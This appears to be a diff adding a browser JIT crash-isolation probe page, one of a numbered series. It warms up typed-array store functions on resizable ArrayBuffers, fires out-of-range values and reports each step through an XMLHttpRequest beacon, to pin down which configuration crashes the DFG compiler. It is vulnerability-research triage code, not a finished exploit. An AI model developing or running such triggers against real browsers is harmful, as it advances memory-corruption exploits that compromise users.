@@ -1,0 +1,199 @@
+<!--
+  p608c: Uint16Array crash isolation — is it Uint16Array or cumulative DFG state?
+
+  p608b showed: Sections A-E survive, Section F (Uint16Array+resizable+5fill) crashes.
+  Is it Uint16Array specifically, or is it the 6th DFG function compiled?
+
+  This probe tests Uint16Array FIRST in isolation, then other types.
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p608c</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+b('P608C-UINT16-FIRST');
+
+// ================================================================
+// SECTION A: Uint16Array + resizable + 5 fillers FIRST (crash candidate)
+// ================================================================
+b('SEC-A:UINT16-RESIZABLE-5FILL-FIRST');
+
+function trigA(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Uint16Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+
+var flA=[];for(var i=0;i<8;i++)flA.push({x:1});
+
+b('A-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigA(42, flA);
+b('A-WARMUP-DONE');
+
+b('A-FIRE-FFFF');
+try{
+    trigA(0xffffffff, flA);
+    b('A-SURVIVED-FFFF');
+}catch(e){
+    b('A-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION B: Uint16Array + resizable + NO fillers (control)
+// ================================================================
+b('SEC-B:UINT16-RESIZABLE-NOFILL');
+
+function trigB(storeVal) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Uint16Array(ab);
+    ta[3] = storeVal;
+    return 0;
+}
+
+b('B-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigB(42);
+b('B-WARMUP-DONE');
+
+b('B-FIRE-FFFF');
+try{
+    trigB(0xffffffff);
+    b('B-SURVIVED-FFFF');
+}catch(e){
+    b('B-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION C: Uint16Array + FIXED AB + 5 fillers (control)
+// ================================================================
+b('SEC-C:UINT16-FIXED-5FILL');
+
+function trigC(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100);
+    var ta = new Uint16Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+
+var flC=[];for(var i=0;i<8;i++)flC.push({x:1});
+
+b('C-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigC(42, flC);
+b('C-WARMUP-DONE');
+
+b('C-FIRE-FFFF');
+try{
+    trigC(0xffffffff, flC);
+    b('C-SURVIVED-FFFF');
+}catch(e){
+    b('C-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION D: Uint16Array + resizable + 8 fillers (more pressure)
+// ================================================================
+b('SEC-D:UINT16-RESIZABLE-8FILL');
+
+function trigD(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Uint16Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];var t5=fillObjs[5];
+    var t6=fillObjs[6];var t7=fillObjs[7];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    t5.y={};t6.y={};t7.y={};
+    return val;
+}
+
+var flD=[];for(var i=0;i<8;i++)flD.push({x:1});
+
+b('D-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigD(42, flD);
+b('D-WARMUP-DONE');
+
+b('D-FIRE-FFFF');
+try{
+    trigD(0xffffffff, flD);
+    b('D-SURVIVED-FFFF');
+}catch(e){
+    b('D-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION E: Uint8Array + resizable + 5 fillers (nearest unsigned type)
+// ================================================================
+b('SEC-E:UINT8-RESIZABLE-5FILL');
+
+function trigE(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Uint8Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+
+var flE=[];for(var i=0;i<8;i++)flE.push({x:1});
+
+b('E-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigE(42, flE);
+b('E-WARMUP-DONE');
+
+b('E-FIRE-FFFF');
+try{
+    trigE(0xffffffff, flE);
+    b('E-SURVIVED-FFFF');
+}catch(e){
+    b('E-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION F: Uint32Array + resizable + 5 fillers (original Exodus type)
+// ================================================================
+b('SEC-F:UINT32-RESIZABLE-5FILL');
+
+function trigF(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Uint32Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+
+var flF=[];for(var i=0;i<8;i++)flF.push({x:1});
+
+b('F-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigF(42, flF);
+b('F-WARMUP-DONE');
+
+b('F-FIRE-FFFF');
+try{
+    trigF(0xffffffff, flF);
+    b('F-SURVIVED-FFFF');
+}catch(e){
+    b('F-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+b('P608C-COMPLETE');
+}
+
+setTimeout(main, 200);
+</script></head><body>p608c: Uint16Array first</body></html>
